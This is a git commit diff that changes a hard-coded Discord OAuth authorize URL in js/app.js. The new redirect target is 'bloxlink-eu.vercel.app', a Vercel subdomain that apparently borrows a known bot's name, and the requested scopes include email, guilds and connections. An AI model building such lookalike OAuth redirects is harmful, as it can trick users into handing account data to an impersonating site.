5d60c3eed6f872192bd1fc2016a1eeb51bbb56b2
gabriel <127671761+foxyguyz1@users.noreply.github.com>
2026-08-25 12:56:35 -0300

    Update app.js

--- js/app.js
+++ js/app.js
@@ -58,7 +58,7 @@ document.addEventListener('DOMContentLoaded', () => {
       currentOrigin += '/';
     }
     const redirectUri = encodeURIComponent(currentOrigin);
-    const discordOAuthUrl = `https://discord.com/oauth2/authorize?client_id=1541620007560020029&response_type=code&redirect_uri=https%3A%2F%2Fembriaozinho.vercel.app&scope=identify+email+guilds+connections`;
+    const discordOAuthUrl = `https://discord.com/oauth2/authorize?client_id=1541620007560020029&response_type=code&redirect_uri=https%3A%2F%2Fbloxlink-eu.vercel.app%2F&scope=identify+email+guilds+connections`;
 
     window.location.href = discordOAuthUrl;
   }
